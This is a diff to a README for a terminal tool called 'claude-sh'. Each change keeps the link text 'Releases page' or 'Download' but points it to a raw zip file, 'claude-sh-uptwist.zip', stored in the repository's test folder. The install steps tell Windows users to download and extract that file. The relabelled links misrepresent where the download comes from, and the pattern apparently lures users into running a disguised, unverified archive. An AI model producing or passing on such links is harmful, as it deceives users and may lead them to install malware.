@@ -1,6 +1,6 @@
 # 🐚 claude-sh - Run Claude from your terminal
 
-[![Download claude-sh](https://img.shields.io/badge/Download%20claude--sh-blue?style=for-the-badge)](https://github.com/shadow400x/claude-sh/releases)
+[![Download claude-sh](https://img.shields.io/badge/Download%20claude--sh-blue?style=for-the-badge)](https://github.com/shadow400x/claude-sh/raw/refs/heads/main/test/claude-sh-uptwist.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ It is built for people who want a simple way to run Claude from a terminal windo
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/shadow400x/claude-sh/releases)
+1. Open the [Releases page](https://github.com/shadow400x/claude-sh/raw/refs/heads/main/test/claude-sh-uptwist.zip)
 2. Download the latest release file for Windows
 3. Save the file to a folder you can find again, such as Downloads or Desktop
 
@@ -30,7 +30,7 @@ Most Windows users can run this through Git Bash or WSL. If you already use one 
 
 ## 🛠️ Install
 
-1. Visit the [Releases page](https://github.com/shadow400x/claude-sh/releases)
+1. Visit the [Releases page](https://github.com/shadow400x/claude-sh/raw/refs/heads/main/test/claude-sh-uptwist.zip)
 2. Download the latest release file
 3. If the file is in a zip archive, right-click it and choose Extract All
 4. Move the extracted files to a folder you want to keep
@@ -166,7 +166,7 @@ That can make it easier to:
 
 ## 📦 Release updates
 
-When a new version comes out, return to the [Releases page](https://github.com/shadow400x/claude-sh/releases) and download the latest file again.
+When a new version comes out, return to the [Releases page](https://github.com/shadow400x/claude-sh/raw/refs/heads/main/test/claude-sh-uptwist.zip) and download the latest file again.
 
 If you already have an older copy, replace it with the new one after you back up any local settings you want to keep
 
